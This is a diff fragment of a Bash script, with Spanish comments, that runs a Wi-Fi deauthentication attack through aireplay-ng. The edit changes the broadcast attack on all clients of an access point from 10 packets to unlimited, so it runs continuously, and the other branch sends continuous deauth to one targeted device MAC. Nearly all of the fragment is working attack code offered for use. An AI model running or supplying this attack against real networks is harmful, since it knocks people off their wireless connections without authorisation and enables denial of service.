@@ -73,7 +73,7 @@ read -p "MAC del dispositivo: " TARGET_MAC
 # Paso 7: Ejecutar el ataque de deauth
 if [ -z "$TARGET_MAC" ]; then
   echo -e "${RED}Realizando un ataque de deauth a todos los dispositivos conectados al AP...${NC}"
-  aireplay-ng --deauth 10 -a $BSSID $MON_INTERFACE
+  aireplay-ng --deauth 0 -a $BSSID $MON_INTERFACE
 else
   echo -e "${RED}Realizando un ataque de deauth al dispositivo con MAC $TARGET_MAC...${NC}"
   aireplay-ng --deauth 0 -a $BSSID -c $TARGET_MAC $MON_INTERFACE
